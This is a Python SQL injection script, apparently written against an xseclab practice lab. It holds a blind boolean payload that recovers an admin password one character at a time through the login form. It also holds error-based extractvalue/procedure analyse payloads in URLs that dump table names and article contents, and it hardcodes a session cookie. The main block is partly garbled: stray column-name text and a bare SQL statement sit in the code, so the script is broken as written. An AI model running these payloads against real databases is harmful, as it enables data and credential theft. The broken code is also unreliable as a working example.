
import requests
import re


def req_login(url,cookie):
    # url = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1"
    # cookie = {
    #     'PHPSESSID':'bdea14ebdeef921503e47536acd53c84'
    # }
    password = ""
    for i in range(1,33):
        for j in '0123456789abcdef':
            payload = "admin'-(ascii(mid(REVERSE(MID((passwd)from(-"+str(i)+")))from(-1)))="+str(ord(j))+")-'"
            data = {
                'uname': payload,
                'passwd': 'sky'
            }
            r = requests.post(url=url,cookies=cookie,data=data)
            if "username error!!@_@" in r.content:
                password += j
                print (password)
                break

def req_sql_limi(url,cookie):
        # url=url
        r=requests.post(url=url,cookies=cookie)
        re_s=re.compile("XPATH syntax error: ':(.*)'<html>",re.S)
        res_table=re.findall(re_s,str(r.content))
        print (res_table[0])

if __name__ == "__main__": 
    url = """http://lab1.xseclab.com//sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?PHPSESSID=bdea14ebdeef921503e47536acd53c84&start=5&num=8%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20table_name%20from%20information_schema.tables%20limit%2010,1))),1)"""
    cookie = {
        'PHPSESSID':'bdea14ebdeef921503e47536acd53c84'
    }
    #select table_schema，table_name information_schema.tables
    #select table_schema，table_name,column_name information_schema.columns
    #16进制 +  2b,

    article+idarticle+titlearticle+contentarticle+otherspic+idpic+picnamepic+datapic+text 
    select 1,2,concat(title,0x2b,content,20182b2019,20182b2019,20182b2019),4 from information_schema.columns
    for i in range(0,20000):
    # req_login(url,cookie)
        url="""http://lab1.xseclab.com//sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?PHPSESSID=bdea14ebdeef921503e47536acd53c84&start=5&num=8 procedure analyse(extractvalue(rand(),concat(0x3a,(select concat(id,title,contents) from mydbs.article limit %s,1))),1)"""%i
        req_sql_limi(url,cookie)